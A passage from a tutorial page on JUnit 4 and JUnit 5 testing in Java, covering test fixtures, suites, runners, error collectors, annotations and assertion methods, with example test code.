class="keyword">public</span> <span class="keyword">void</span> <span class="title">testFile2</span><span class="params">()</span> </span>&#123;</span><br><span class="line">       <span class="comment">// code for test case objective</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>A test fixture is a context where a <strong>Test Case</strong> runs. Typically, test fixtures include:</p><ul><li>Objects or resources that are available for any test case.</li><li>Activities required that makes these objects/resources available, such as <strong>setup</strong> and <strong>teardown</strong>.</li></ul><h3 id="Test-Suites"><a href="#Test-Suites" class="headerlink" title="Test Suites"></a>Test Suites</h3><p>Test suite allows us to aggregate all test cases from multiple classes in an order in one place and run it together.</p><p>To run the suite test, you need to annotate a class using below-mentioned annotations:</p><p>@Runwith(Suite.class)</p><p>@SuiteClasses(test1.class,test2.class……) or @Suite.SuiteClasses ({test1.class, test2.class……})</p><p>例子：</p><p><img src="/2021/manual-of-JUnit/052416_0732_CreateJUnit3.png" alt="Create JUnit Test Suite"></p><p><img src="/2021/manual-of-JUnit/052416_0732_CreateJUnit4.png" alt="Create JUnit Test Suite"></p><h3 id="Test-Runner"><a href="#Test-Runner" class="headerlink" title="Test Runner"></a>Test Runner</h3><p>a tool for execution of the test cases.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;                </span><br><span class="line">true<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;        </span><br><span class="line">truetrueResult result = JUnitCore.runClasses(CreateAndSetName.class);</span><br><span class="line">        <span class="keyword">for</span> (Failure failure : result.getFailures()) &#123;</span><br><span class="line">            System.out.println(failure.toString());                    </span><br><span class="line">         &#125;        </span><br><span class="line">          System.out.println(result.wasSuccessful());                    </span><br><span class="line">       &#125;        </span><br><span class="line">&#125;      </span><br></pre></td></tr></table></figure><h3 id="Test-Scenario"><a href="#Test-Scenario" class="headerlink" title="Test Scenario"></a>Test Scenario</h3><p>A test scenario is defined as any functionality that can be tested. It is also called <em>Test Condition</em> or <em>Test Possibility</em>. </p><h3 id="Error-Collector"><a href="#Error-Collector" class="headerlink" title="Error Collector"></a>Error Collector</h3><p>With JUnit error collector, you can still continue with the test execution even after an issue is found or test fails. Error collector collects all error objects and reports it only once after the test execution is over.</p><h2 id="Annotations"><a href="#Annotations" class="headerlink" title="Annotations"></a>Annotations</h2><h3 id="Before-and-After"><a href="#Before-and-After" class="headerlink" title="@Before and @After"></a>@Before and @After</h3><p><strong>@Before</strong> annotation is used on a method containing code to run before each test case. i.e it runs before each test execution. <strong>@After</strong> annotation is used on a method containing java code to run after each test case. These methods will run even if any exceptions are thrown in the test case or in the case of assertion failures.</p><ul><li>All the methods annotated with <strong>@Before</strong> will run before each test case, but they may run in any order. </li><li>You can inherit @Before and @After methods from a super class, Execution is as follows: It is a standard execution process in JUnit.</li></ul><ol><li>Execute the @Before methods in the superclass</li><li>Execute the @Before methods in this class</li><li>Execute a @Test method in this class</li><li>Execute the @After methods in this class</li><li>Execute the @After methods in the superclass</li></ol><h3 id="BeforeClass-and-AfterClass"><a href="#BeforeClass-and-AfterClass" class="headerlink" title="@BeforeClass and @AfterClass"></a>@BeforeClass and @AfterClass</h3><p>Run a method only once for the entire test class before(after) any of the tests are executed. They are used for “<strong>once-only setup</strong>“ and “<strong>once-only teardown</strong>“, such as start &amp; stop servers and open &amp; close communication.</p><table><thead><tr><th align="left"><strong>Annotations</strong></th><th align="left"><strong>Description</strong></th></tr></thead><tbody><tr><td align="left">@Test</td><td align="left">This annotation is a replacement of org.junit.TestCase which indicates that public void method to which it is attached can be executed as a test Case.</td></tr><tr><td align="left">@Ignore</td><td align="left">This annotation can be used if you want to ignore some statements during test execution for e.g. disabling some test cases during test execution.</td></tr><tr><td align="left">@Test(timeout=500)</td><td align="left">This annotation can be used if you want to set some timeout during test execution for e.g. if you are working under some SLA (Service level agreement), and tests need to be completed within some specified time.</td></tr><tr><td align="left">@Test(expected=IllegalArgumentException.class)</td><td align="left">This annotation can be used if you want to handle some exception during test execution. For, e.g., if you want to check whether a particular method is throwing specified exception or not.</td></tr></tbody></table><h3 id="Ignore"><a href="#Ignore" class="headerlink" title="@Ignore"></a>@Ignore</h3><p>can be used in two scenarios as given below:</p><ol><li>If you want to ignore a test method, use @Ignore along with @Test annotation.</li><li>If you want to ignore all the tests of class, use @Ignore annotation at the class level.</li></ol><p>For exception testing, you can use</p><ul><li><strong>Optional parameter (expected) of @test</strong> annotation and</li><li>To trace the information ,”fail()” can be used</li></ul><h3 id="Rule"><a href="#Rule" class="headerlink" title="@Rule"></a>@Rule</h3><p>is used to create an object of error collector. Once the object for error collector is created, you can easily add all the errors into the object using method <strong>addError (Throwable error)</strong>, these errors will be logged in JUnit test result.</p><p>example:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> guru99.junit;        </span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.junit.Assert;        </span><br><span class="line"><span class="keyword">import</span> org.junit.Rule;        </span><br><span class="line"><span class="keyword">import</span> org.junit.Test;        </span><br><span class="line"><span class="keyword">import</span> org.junit.rules.ErrorCollector;        </span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ErrorCollectorExample</span> </span>&#123;                </span><br><span class="line">    <span class="meta">@Rule</span>        </span><br><span class="line">    <span class="keyword">public</span> ErrorCollector collector = <span class="keyword">new</span> ErrorCollector();                        </span><br><span class="line">    <span class="meta">@Test</span>        </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">example</span><span class="params">()</span> </span>&#123;                    </span><br><span class="line">    collector.addError(<span class="keyword">new</span> Throwable(<span class="string">&quot;There is an error in first line&quot;</span>));        </span><br><span class="line">    collector.addError(<span class="keyword">new</span> Throwable(<span class="string">&quot;There is an error in second line&quot;</span>));</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello&quot;</span>);                    </span><br><span class="line">        <span class="keyword">try</span> &#123;            </span><br><span class="line">            Assert.assertTrue(<span class="string">&quot;A &quot;</span> == <span class="string">&quot;B&quot;</span>);                    </span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable t) &#123;                    </span><br><span class="line">            collector.addError(t);                    </span><br><span class="line">        &#125;        </span><br><span class="line">        System.out.println(<span class="string">&quot;World!!!!&quot;</span>);                    </span><br><span class="line">    &#125;        </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/manual-of-JUnit/052416_1156_JUnitErrorC1.png" alt="JUnit ErrorCollector"></p><h3 id="Parameters"><a href="#Parameters" class="headerlink" title="@Parameters"></a>@Parameters</h3><p>Parameterized test is to execute the same test over and over again using different values. It helps developer to save time in executing same test which differs only in their inputs and expected results. Using Parameterized test, one can set up a test method that retrieves data from some data source.</p><p>example:</p><ol><li>Create a parameterized test class</li></ol><p><img src="/2021/manual-of-JUnit/052416_1228_JUnitParame3.png" alt="JUnit Parameterized Test"></p><p><strong>@RunWith</strong> annotation is used to specify its runner class name. If we don’t specify any type as a parameter, the runtime will choose <strong>BlockJunit4ClassRunner</strong> by default.</p><ol start="2"><li><p>Create a constructor that stores the test data. It stores 3 variables</p><p><img src="/2021/manual-of-JUnit/052416_1228_JUnitParame4.png" alt="JUnit Parameterized Test"></p></li><li><p>Create a static method that generates and returns test data.</p></li></ol><p><img src="/2021/manual-of-JUnit/052416_1228_JUnitParame5.png" alt="JUnit Parameterized Test"></p><p><img src="/2021/manual-of-JUnit/052416_1228_JUnitParame6.png" alt="JUnit Parameterized Test"></p><ol start="4"><li>Create a test runner class to run parameterized test</li></ol><p><img src="/2021/manual-of-JUnit/052416_1228_JUnitParame7.png" alt="JUnit Parameterized Test"></p><h2 id="Assertions"><a href="#Assertions" class="headerlink" title="Assertions"></a>Assertions</h2><ul><li>org.junit.Assert</li></ul><table><thead><tr><th align="left"><strong>Method</strong></th><th align="left"><strong>Description</strong></th></tr></thead><tbody><tr><td align="left">void assertEquals(boolean expected, boolean actual)</td><td align="left">It checks whether two values are equals similar to equals method of Object class</td></tr><tr><td align="left">void assertFalse(boolean condition)</td><td align="left">functionality is to check that a condition is false.</td></tr><tr><td align="left">void assertNotNull(Object object)</td><td align="left">“assertNotNull” functionality is to check that an object is not null.</td></tr><tr><td align="left">void assertNull(Object object)</td><td align="left">“assertNull” functionality is to check that an object is null.</td></tr><tr><td align="left">void assertTrue(boolean condition)</td><td align="left">“assertTrue” functionality is to check that a condition is true.</td></tr><tr><td align="left">void fail()</td><td align="left">If you want to throw any assertion error, you have fail() that always results in a fail verdict.</td></tr><tr><td align="left">void assertSame([String message]</td><td align="left">“assertSame” functionality is to check that the two objects refer to the same object.</td></tr><tr><td align="left">void assertNotSame([String message]</td><td align="left">“assertNotSame” functionality is to check that the two objects do not refer to the same object.</td></tr></tbody></table><ul><li><strong>assertArrayEquals(expected, actual)</strong>: if arrays have the same length</li><li><strong>assertEquals( aDoubleValue, anotherDoubleValue, 0.001 )</strong>: Math.abs( expected – actual ) &lt;= delta</li></ul><h2 id="Class-and-Methods"><a href="#Class-and-Methods" class="headerlink" title="Class and Methods"></a>Class and Methods</h2><h3 id="org-junit-TestCase"><a href="#org-junit-TestCase" class="headerlink" title="org.junit.TestCase"></a>org.junit.TestCase</h3><table><thead><tr><th align="left"><strong>Method</strong></th><th align="left"><strong>Description</strong></th></tr></thead><tbody><tr><td align="left">int countTestCases()</td><td align="left">This method is used to count how many number of test cases executed by <strong>run(TestResult tr)</strong> method.</td></tr><tr><td align="left">TestResult createResult()</td><td align="left">This method is used to create a <strong>TestResult</strong> object.</td></tr><tr><td align="left">String getName()</td><td align="left">This method returns a string which is nothing but a <strong>TestCase</strong>.</td></tr><tr><td align="left">TestResult run()</td><td align="left">This method is used to execute a test which returns a <strong>TestResult</strong> object</td></tr><tr><td align="left">void run(TestResult result)</td><td align="left">This method is used to execute a test having a <strong>TestResult</strong> object which doesn’t returns anything.</td></tr><tr><td align="left">void setName(String name)</td><td align="left">This method is used to set a name of a <strong>TestCase.</strong></td></tr><tr><td align="left">void setUp()</td><td align="left">This method is used to write resource association code. e.g. Create a database connection.</td></tr><tr><td align="left">void tearDown()</td><td align="left">This method is used to write resource release code. e.g. Release database connection after performing transaction operation.</td></tr></tbody></table><h3 id="org-junit-TestResult"><a href="#org-junit-TestResult" class="headerlink" title="org.junit.TestResult"></a>org.junit.TestResult</h3><table><thead><tr><th align="left"><strong>Method</strong></th><th align="left"><strong>Description</strong></th></tr></thead><tbody><tr><td align="left">void addError(Test test, Throwable t)</td><td align="left">This method is used if you require add an error to the test.</td></tr><tr><td align="left">void addFailure(Test test, AssertionFailedError t)</td><td align="left">This method is used if you require add a failure to the list of failures.</td></tr><tr><td align="left">void endTest(Test test)</td><td align="left">This method is used to notify that a test is performed(completed)</td></tr><tr><td align="left">int errorCount()</td><td align="left">This method is used to get the error detected during test execution.</td></tr><tr><td align="left">Enumeration&lt;TestFailure&gt; errors()</td><td align="left">This method simply returns a collection (Enumeration here) of errors.</td></tr><tr><td align="left">int failureCount()</td><td align="left">This method is used to get the count of errors detected during test execution.</td></tr><tr><td align="left">void run(TestCase test)</td><td align="left">This method is used to execute a test case.</td></tr><tr><td align="left">int runCount()</td><td align="left">This method simply counts the executed test.</td></tr><tr><td align="left">void startTest(Test test)</td><td align="left">This method is used to notify that a test is started.</td></tr><tr><td align="left">void stop()</td><td align="left">This method is used to test run to be stopped.</td></tr></tbody></table><h3 id="org-junit-TestSuite"><a href="#org-junit-TestSuite" class="headerlink" title="org.junit.TestSuite"></a>org.junit.TestSuite</h3><table><thead><tr><th align="left"><strong>Method</strong></th><th align="left"><strong>Description</strong></th></tr></thead><tbody><tr><td align="left">void addTest(Test test)</td><td align="left">This method is used if you want to add a test to the suite.</td></tr><tr><td align="left">void addTestSuite(Class&lt;? extends TestCase&gt; testClass)</td><td align="left">This method is used if you want to specify the class while adding a test to the suite.</td></tr><tr><td align="left">int countTestCases()</td><td align="left">This method is used if you want to count the number of test cases.</td></tr><tr><td align="left">String getName()</td><td align="left">This method is used to get the name of the test suite.</td></tr><tr><td align="left">void run(TestResult result)</td><td align="left">This method is used to execute a test and collect test result in <strong>TestResult</strong> object.</td></tr><tr><td align="left">void setName(String name)</td><td align="left">This method is used to set the name of <strong>TestSuite</strong>.</td></tr><tr><td align="left">Test testAt(int index)</td><td align="left">This method is used if you want to return the test at given index.</td></tr><tr><td align="left">int testCount()</td><td align="left">This method is used if you want to return a number of tests in the Suite.</td></tr><tr><td align="left">static Test warning(String message)</td><td align="left">This method returns a test which will fail and log a warning message.</td></tr></tbody></table><h1 id="JUnit-5"><a href="#JUnit-5" class="headerlink" title="JUnit 5"></a>JUnit 5</h1><blockquote><p>JUnit 5 = JUnit Platform + JUnit Jupiter + JUnit Vintage</p></blockquote><h2 id="Annotations-1"><a href="#Annotations-1" class="headerlink" title="Annotations"></a>Annotations</h2><p>Unless otherwise stated, all core annotations are located in the <code>org.junit.jupiter.api</code> package in the <code>junit-jupiter-api</code> module.</p><table><thead><tr><th align="left">Annotation</th><th align="left">Description</th></tr></thead><tbody><tr><td align="left"><code>@Test</code></td><td align="left">Denotes that a method is a test method. Unlike JUnit 4’s <code>@Test</code> annotation, this annotation does not declare any attributes, since test extensions in JUnit Jupiter operate based on their own dedicated annotations. Such methods are <em>inherited</em> unless they are <em>overridden</em>.</td></tr><tr><td align="left"><code>@ParameterizedTest</code></td><td align="left">Denotes that a method is a <a href="https://junit.org/junit5/docs/current/user-guide/#writing-tests-parameterized-tests">parameterized test</a>. Such methods are <em>inherited</em> unless they are <em>overridden</em>.</td></tr><tr><td align="left"><code>@RepeatedTest</code></td><td align="left">Denotes that a method is a test template for a <a href="https://junit.org/junit5/docs/current/user-guide/#writing-tests-repeated-tests">repeated test</a>. Such methods are <em>inherited</em> unless they are <em>overridden</em>.</td></tr><tr><td align="left"><code>@TestFactory</code></td><td align="left">Denotes that a method is a test factory for <a href="https://junit.org/junit5/docs/current/user-guide/#writing-tests-dynamic-tests">dynamic tests</a>. Such methods are <em>inherited</em> unless they are <em>overridden</em>.</td></tr><tr><td align="left"><code>@TestTemplate</code></td><td align="left">Denotes that a method is a <a href="https://junit.org/junit5/docs/current/user-guide/#writing-tests-test-templates">template for test cases</a> designed to be invoked multiple times depending on the number of invocation contexts returned by the registered <a href="https://junit.org/junit5/docs/current/user-guide/#extensions-test-templates">providers</a>. Such methods are <em>inherited</em> unless they are <em>overridden</em>.</td></tr><tr><td align="left"><code>@TestMethodOrder</code></td><td align="left">Used to configure the <a href="https://junit.org/junit5/docs/current/user-guide/#writing-tests-test-execution-order">test method execution order</a> for the annotated test class; similar to JUnit 4’s <code>@FixMethodOrder</code>. Such annotations are <em>inherited</em>.</td></tr><tr><td align="left"><code>@TestInstance</code></td><td align="left">Used to configure the <a href="https://junit.org/junit5/docs/current/user-guide/#writing-tests-test-instance-lifecycle">test instance lifecycle</a> for the annotated test class. Such annotations are <em>inherited</em>.</td></tr><tr><td align="left"><code>@DisplayName</code></td><td align="left">Declares a custom <a href="https://junit.org/junit5/docs/current/user-guide/#writing-tests-display-names">display name</a> for the test class or test method. Such annotations are not <em>inherited</em>.</td></tr><tr><td align="left"><code>@DisplayNameGeneration</code></td><td align="left">Declares a custom <a href="https://junit.org/junit5/docs/current/user-guide/#writing-tests-display-name-generator">display name generator</a> for the test class. Such annotations are <em>inherited</em>.</td></tr><tr><td align="left"><code>@BeforeEach</code></td><td align="left">Denotes that the annotated method should be executed <em>before</em> <strong>each</strong> <code>@Test</code>, <code>@RepeatedTest</code>, <code>@ParameterizedTest</code>, or <code>@TestFactory</code> method in the current class; analogous to JUnit 4’s <code>@Before</code>. Such methods are <em>inherited</em> unless they are <em>overridden</em>.</td></tr><tr><td align="left"><code>@AfterEach</code></td><td align="left">Denotes that the annotated method should be executed <em>after</em> <strong>each</strong> <code>@Test</code>, <code>@RepeatedTest</code>, <code>@ParameterizedTest</code>, or <code>@TestFactory</code> method in the current class; analogous to JUnit 4’s <code>@After</code>. Such methods are <em>inherited</em> unless they are <em>overridden</em>.</td></tr><tr><td align="left"><code>@BeforeAll</code></td><td align="left">Denotes that the annotated method should be executed <em>before</em> <strong>all</strong> <code>@Test</code>, <code>@RepeatedTest</code>, <code>@ParameterizedTest</code>, and <code>@TestFactory</code> methods in the current class; analogous to JUnit 4’s <code>@BeforeClass</code>. Such methods are <em>inherited</em> (unless they are <em>hidden</em> or <em>overridden</em>) and must be <code>static</code> (unless the “per-class” <a href="https://junit.org/junit5/docs/current/user-guide/#writing-tests-test-instance-lifecycle">test instance lifecycle</a> is used).</td></tr><tr><td align="left"><code>@AfterAll</code></td><td align="left">Denotes that the annotated method should be executed <em>after</em> <strong>all</strong> <code>@Test</code>, <code>@RepeatedTest</code>, <code>@ParameterizedTest</code>, and <code>@TestFactory</code> methods in the current class; analogous to JUnit 4’s <code>@AfterClass</code>. Such methods are <em>inherited</em> (unless they are <em>hidden</em> or <em>overridden</em>) and must be <code>static</code> (unless the “per-class” <a href="https://junit.org/junit5/docs/current/user-guide/#writing-tests-test-instance-lifecycle">test instance lifecycle</a> is used).</td></tr><tr><td align="left"><code>@Nested</code></td><td align="left">Denotes that the annotated class is a non-static <a href="https://junit.org/junit5/docs/current/user-guide/#writing-tests-nested">nested test class</a>. <code>@BeforeAll</code> and <code>@AfterAll</code> methods cannot be used directly in a <code>@Nested</code> test class unless the “per-class” <a href="https://junit.org/junit5/docs/current/user-guide/#writing-tests-test-instance-lifecycle">test instance lifecycle</a> is used. Such annotations are not <em>inherited</em>.</td></tr><tr><td align="left"><code>@Tag</code></td><td align="left">Used to declare <a href="https://junit.org/junit5/docs/current/user-guide/#writing-tests-tagging-and-filtering">tags for filtering tests</a>, either at the class or method level; analogous to test groups in TestNG or Categories in JUnit 4. Such annotations are <em>inherited</em> at the class level but not at the method level.</td></tr><tr><td align="left"><code>@Disabled</code></td><td align="left">Used to <a href="https://junit.org/junit5/docs/current/user-guide/#writing-tests-disabling">disable</a> a test class or test method; analogous to JUnit 4’s <code>@Ignore</code>. Such annotations are not <em>inherited</em>.</td></tr><tr><td align="left"><code>@Timeout</code></td><td align="left">Used to fail a test, test factory, test template, or lifecycle method if its execution exceeds a given duration. Such annotations are <em>inherited</em>.</td></tr><tr><td align="left"><code>@ExtendWith</code></td><td align="left">Used to <a href="https://junit.org/junit5/docs/current/user-guide/#extensions-registration-declarative">register extensions declaratively</a>. Such annotations are <em>inherited</em>.</td></tr><tr><td align="left"><code>@RegisterExtension</code></td><td align="left">Used to <a href="https://junit.org/junit5/docs/current/user-guide/#extensions-registration-programmatic">register extensions programmatically</a> via fields. Such fields are <em>inherited</em> unless they are <em>shadowed</em>.</td></tr><tr><td align="left"><code>@TempDir</code></td><td align="left">Used to supply a <a href="https://junit.org/junit5/docs/current/user-guide/#writing-tests-built-in-extensions-TempDirectory">temporary directory</a> via field injection or parameter injection in a lifecycle method or test method; located in the <code>org.junit.jupiter.api.io</code> package.</td></tr></tbody></table><h2 id="Assertions-1"><a href="#Assertions-1" class="headerlink" title="Assertions"></a>Assertions</h2><p>JUnit Jupiter comes with many of the assertion methods that JUnit 4 has and adds a few that lend themselves well to being used with Java 8 lambdas. All JUnit Jupiter assertions are <code>static</code> methods in the <code>org.junit.jupiter.api.Assertions</code> class.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> java.time.Duration.ofMillis;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> java.time.Duration.ofMinutes;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.junit.jupiter.api.Assertions.assertAll;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.junit.jupiter.api.Assertions.assertEquals;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.junit.jupiter.api.Assertions.assertNotNull;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.junit.jupiter.api.Assertions.assertThrows;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.junit.jupiter.api.Assertions.assertTimeout;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.junit.jupiter.api.Assertions.assertTimeoutPreemptively;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.junit.jupiter.api.Assertions.assertTrue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.CountDownLatch;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> example.domain.Person;</span><br><span class="line"><span class="keyword">import</span> example.util.Calculator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.junit.jupiter.api.Test;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AssertionsDemo</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Calculator calculator = <span class="keyword">new</span> Calculator();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Person person = <span class="keyword">new</span> Person(<span class="string">&quot;Jane&quot;</span>, <span class="string">&quot;Doe&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">standardAssertions</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        assertEquals(<span class="number">2</span>, calculator.add(<span class="number">1</span>, <span class="number">1</span>));</span><br><span class="line">        assertEquals(<span class="number">4</span>, calculator.multiply(<span class="number">2</span>, <span class="number">2</span>),</span><br><span class="line">                <span class="string">&quot;The optional failure message is now the last parameter&quot;</span>);</span><br><span class="line">        assertTrue(<span class="string">&#x27;a&#x27;</span> &lt; <span class="string">&#x27;b&#x27;</span>, () -&gt; <span class="string">&quot;Assertion messages can be lazily evaluated -- &quot;</span></span><br><span class="line">                + <span class="string">&quot;to avoid constructing complex messages unnecessarily.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">groupedAssertions</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">// In a grouped assertion all assertions are executed, and all</span></span><br><span class="line">        <span class="comment">// failures will be reported together.</span></span><br><span class="line">        assertAll(<span class="string">&quot;person&quot;</span>,</span><br><span class="line">            () -&gt; assertEquals(<span class="string">&quot;Jane&quot;</span>, person.getFirstName()),</span><br><span class="line">            () -&gt; assertEquals(<span class="string">&quot;Doe&quot;</span>, person.getLastName())</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">dependentAssertions</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">// Within a code block, if an assertion fails the</span></span><br><span class="line">        <span class="comment">// subsequent code in the same block will be skipped.</span></span><br><span class="line">        assertAll(<span class="string">&quot;properties&quot;</span>,</span><br><span class="line">            () -&gt; &#123;</span><br><span class="line">                String firstName = person.getFirstName();</span><br><span class="line">                assertNotNull(firstName);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// Executed only if the previous assertion is valid.</span></span><br><span class="line">                assertAll(<span class="string">&quot;first name&quot;</span>,</span><br><span class="line">                    () -&gt; assertTrue(firstName.startsWith(<span class="string">&quot;J&quot;</span>)),</span><br><span class="line">                    () -&gt; assertTrue(firstName.endsWith(<span class="string">&quot;e&quot;</span>))</span><br><span class="line">                );</span><br><span class="line">            &#125;,</span><br><span class="line">            () -&gt; &#123;</span><br><span class="line">                <span class="comment">// Grouped assertion, so processed independently</span></span><br><span class="line">                <span class="comment">// of results of first name assertions.</span></span><br><span class="line">                String lastName = person.getLastName();</span><br><span class="line">                assertNotNull(lastName);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// Executed only if the previous assertion is valid.</span></span><br><span class="line">                assertAll(<span class="string">&quot;last name&quot;</span>,</span><br><span class="line">                    () -&gt; assertTrue(lastName.startsWith(<span class="string">&quot;D&quot;</span>)),</span><br><span class="line">                    () -&gt; assertTrue(lastName.endsWith(<span class="string">&quot;e&quot;</span>))</span><br><span class="line">                );</span><br><span class="line">            &#125;</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">exceptionTesting</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        Exception exception = assertThrows(ArithmeticException.class, () -&gt;</span><br><span class="line">            calculator.divide(<span class="number">1</span>, <span class="number">0</span>));</span><br><span class="line">        assertEquals(<span class="string">&quot;/ by zero&quot;</span>, exception.getMessage());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">timeoutNotExceeded</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">// The following assertion succeeds.</span></span><br><span class="line">        assertTimeout(ofMinutes(<span class="number">2</span>), () -&gt; &#123;</span><br><span class="line">            <span class="comment">// Perform task that takes less than 2 minutes.</span></span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">timeoutNotExceededWithResult</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">// The following assertion succeeds, and returns the supplied object.</span></span><br><span class="line">        String actualResult = assertTimeout(ofMinutes(<span class="number">2</span>), () -&gt; &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;a result&quot;</span>;</span><br><span class="line">        &#125;);</span><br><span class="line">        assertEquals(<span class="string">&quot;a result&quot;</span>, actualResult);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> 